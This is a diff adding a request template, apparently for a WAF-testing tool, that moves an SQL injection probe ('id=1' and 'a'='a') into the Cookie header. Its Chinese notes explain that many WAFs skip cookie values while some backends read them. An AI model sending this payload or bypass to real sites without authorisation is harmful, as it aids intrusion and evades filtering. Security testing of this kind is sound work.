@@ -1,0 +1,14 @@
+# @name: 注入参数放入Cookie
+# @tags: get,sqli,cookie,param,id,bypass
+# @color: yellow
+# @validate: baseline_similarity
+# @threshold: 0.90
+# @intent: param_to_cookie
+# @intent.param: id
+# @intent.payload: id=1' and 'a'='a
+# @note: 将注入参数放入 Cookie 头，很多 WAF 只检测 URL/Body 不解析 Cookie 值，而后端框架(PHP register_globals/某些 CMS 从 cookie 取同名变量)，形成检测盲区。
+GET / HTTP/1.1
+Host: {{TARGET_HOST_HEADER}}
+User-Agent: {{USER_AGENT}}
+Cookie: id=1'+and+'a'='a
+
